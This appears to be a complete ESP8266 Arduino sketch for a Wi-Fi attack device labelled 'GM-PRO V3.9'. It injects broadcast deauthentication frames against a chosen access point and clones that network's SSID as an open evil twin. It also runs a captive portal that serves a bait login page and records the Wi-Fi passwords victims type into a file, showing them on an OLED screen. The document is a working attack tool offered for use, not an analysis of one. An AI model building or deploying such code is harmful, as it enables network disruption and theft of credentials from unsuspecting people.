#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <FS.h>
#include <Wire.h>
#include "SSD1306Wire.h"

extern "C" {
  #include "user_interface.h"
}

SSD1306Wire display(0x3c, D2, D1, GEOMETRY_64_48); 

struct Network {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int signal;
};

Network _networks[15];
Network _selectedNet;
String _logs = "[SYSTEM] Ready...\n";
String activeUmpan = "/index.html"; 
String lastPass = "";
bool isDeauthing = false;
unsigned long lastDeauthTime = 0;

DNSServer dnsServer;
ESP8266WebServer server(80);

// FUNGSI KIRIM PAKET DEAUTH (RAHASIA SDK 2.0.0)
void sendDeauth(uint8_t* target, uint8_t* ap, uint8_t ch) {
  wifi_set_channel(ch);
  uint8_t packet[26] = {
    0xC0, 0x00, 0x3A, 0x01, 
    target[0], target[1], target[2], target[3], target[4], target[5], // Receiver
    ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],                         // Sender
    ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],                         // BSSID
    0x00, 0x00, 0x01, 0x00
  };
  wifi_send_pkt_freedom(packet, 26, 0);
}

void drawOLED() {
  display.clear();
  display.setFont(ArialMT_Plain_10);
  display.drawString(0, 0, "GM-PRO V3.9");
  display.drawLine(0, 11, 64, 11);
  if (lastPass != "") {
    display.drawString(0, 15, "GOT PASS!");
    display.drawString(0, 28, lastPass.substring(0, 8));
  } else if (isDeauthing) {
    display.drawString(0, 15, "DEAUTHING");
    display.drawString(0, 28, "CH:" + String(_selectedNet.ch));
  } else {
    display.drawString(0, 15, "> STANDBY");
    display.drawString(0, 28, "VIVO1904");
  }
  display.display();
}

void handleUpload() {
  HTTPUpload& upload = server.upload();
  if (upload.status == UPLOAD_FILE_START) {
    String filename = upload.filename;
    if (!filename.startsWith("/")) filename = "/" + filename;
    File file = SPIFFS.open(filename, "w");
    file.close();
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    File file = SPIFFS.open(upload.filename, "a");
    if (file) file.write(upload.buf, upload.currentSize);
    file.close();
  }
}

void setup() {
  SPIFFS.begin();
  display.init();
  display.flipScreenVertically();
  
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1); // Aktifkan mode injeksi paket
  
  WiFi.softAP("vivo1904", "sangkur87"); 
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  server.on("/", HTTP_GET, []() {
    File f = SPIFFS.open("/index.html", "r");
    server.streamFile(f, "text/html");
    f.close();
  });

  server.on("/set_umpan", []() {
    activeUmpan = "/" + server.arg("file");
    server.send(200, "text/html", "<script>location.href='/';</script>");
  });

  // LOGIKA TOMBOL DEAUTH
  server.on("/deauth", []() {
    isDeauthing = !isDeauthing;
    _logs += isDeauthing ? "[ATTACK] Deauth Started\n" : "[ATTACK] Deauth Stopped\n";
    server.send(200, "text/html", "<script>location.href='/';</script>");
  });

  // LOGIKA EVIL TWIN (CLONE SSID)
  server.on("/etwin", []() {
    WiFi.softAP(_selectedNet.ssid.c_str(), ""); // Buka tanpa pass
    _logs += "[ETWIN] Cloned: " + _selectedNet.ssid + "\n";
    server.send(200, "text/html", "<script>location.href='/';</script>");
  });

  server.on("/login", []() {
    String p = server.arg("p");
    if (p != "") {
      lastPass = p;
      File f = SPIFFS.open("/pass.txt", "a");
      f.println("Target: " + _selectedNet.ssid + " | Pass: " + p);
      f.close();
      _logs += "[HIT] Pass: " + p + "\n";
    }
    server.send(200, "text/html", "Checking...");
  });

  server.on("/upload", HTTP_POST, []() {
    server.send(200, "text/html", "<script>location.href='/';</script>");
  }, handleUpload);

  server.onNotFound([]() {
    File f = SPIFFS.open(activeUmpan, "r");
    if (f) { server.streamFile(f, "text/html"); f.close(); }
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  drawOLED();

  // EKSEKUSI DEAUTH (Kirim paket setiap 100ms)
  if (isDeauthing && (millis() - lastDeauthTime > 100)) {
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    sendDeauth(broadcast, _selectedNet.bssid, _selectedNet.ch);
    lastDeauthTime = millis();
  }
  
  if (!isDeauthing && millis() % 5000 == 0) {
    int n = WiFi.scanNetworks();
    for (int i = 0; i < n && i < 15; i++) {
      _networks[i].ssid = WiFi.SSID(i);
      _networks[i].ch = WiFi.channel(i);
      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
    }
  }
}
